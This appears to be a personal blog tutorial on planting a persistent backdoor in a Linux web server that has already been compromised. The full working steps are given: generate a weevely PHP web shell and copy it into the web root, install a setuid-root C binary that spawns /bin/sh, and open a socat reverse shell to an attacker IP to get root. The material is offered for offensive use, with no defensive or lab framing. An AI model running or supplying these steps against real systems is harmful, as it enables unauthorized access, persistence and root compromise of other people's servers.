---
title: "Persistent Backdoor in Linux Environment"
subtitle: ""
date: 2021-02-18T14:53:36+05:00
lastmod: 2021-02-18T14:53:36+05:00
draft: false
author: "Abdullah Khabir"
authorLink: "https://abdullah.today"
description: ""

tags: [backdoor, persistent backdoor, trojan, malware, RAT, security, weevely, super user, privileges escalation, pivoting]
categories: []

hiddenFromHomePage: false
hiddenFromSearch: false

featuredImage: ""
featuredImagePreview: ""

toc:
  enable: true
math:
  enable: false
lightgallery: false
license: ""
---
So you have hacked a linux box. Next step should be leave a persistent backdoor 
so in case, it is rebooted, you have to repeat all those steps again and again.

There are multiple methods available to create a persistent backdoor. 
Today I'm going to explain how you can create a backdoor in webservers.

### Tools needed
- socat
- weevely
- some common sense

### Installing Tools

#### weevely

Install weevely if you don't have it. Its written in Python. Availabe in Kali Linux by default. 

If you don't have Kali Linux installed, just clone the repository and install 
it.

```bash
git clone https://github.com/epinna/weevely3.git
cd weevely3
pip3 install -r requirements.txt --upgrade
```
If you don't have RUST installed, you can install weevely as

```bash
CRYPTOGRAPHY_DONT_BUILD_RUST=1 pip3 install -r requirements.txt --upgrade
```
#### socat

Install socat for your OS. You can grab binaries from [here](https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat).

```bash
wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /usr/bin/socat
chmod +x /usr/bin/socat
```

### Creating backdoor

With weevely we are going to create a backdoor.

```bash
weevely generate backdoor.php some_password
```
Replace some_password with some memorable password.

If you get errors like no weevely found, go to git repository and run weevely.py 
with python.

```bash
cd weevely3
python3 weevely.py generate backdoor.php some_password
```

### Push backdoor to web server

Now we have our backdoor created, next job is to push it to webserver. Copy it 
to webserver's root.

```bash
scp backdoor.php 192.168.1.100:/var/www/html/backdoor.php
```

### Executing our backdoor

You can execute your backdoor with weevely like this:

```bash
weevely http://192.168.1.100/backdoor.php some_password
```

Replace some_password with the password you entered while creating this 
backdoor.

Execute `ls` and you will get a shell.
You can use :help to get other weevely options.
Just type : and press TAB to get auto complete options.


### Extending our backdoor

This backdoor will give you a normal user access. You can extend it. Lets do it.

#### Creating SUID executable

In your local machine, create a new file with these contents:

```bash
cat mysuid.c

int main() {
    setresuid(0,0,0);
    system("/bin/sh");
}
```

Compile it, change permissions and set suid.

```bash
gcc -o mysuid mysuid.c
chown root:root mysuid
chmod u+s mysuid
```

#### Push SUID bit executable to victim

Now push this executable to victim system as root.

```bash
scp mysuid 192.168.1.100:/usr/bin/mysuid
```
#### Push socat to victim 

If victim system doesn't have socat, push socat from local system or download 
binary from Github as stated above.

```bash
scp /usr/bin/scoat 192.168.1.100:/usr/bin/socat
```

Or in victim system run this:

```bash
wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /usr/bin/socat
chmod +x /usr/bin/socat
```

### Getting root shell

On your local machine, run:

```bash
socat file:`tty`,raw,echo=0 TCP-L:1337
```

Using weevely get a non-privileged shell. And run this:

```bash
/usr/bin/socat exec:'/bin/bash -li',pty,stderr,setsid,sigint,sane tcp:YOUR_ATTACK_MACHINE_IP:1337
```

You will get a shell. Now execute mysuid we copied earlier.

```bash
/usr/bin/mysuid
```

You will get a root shell.

Thanks for reading.
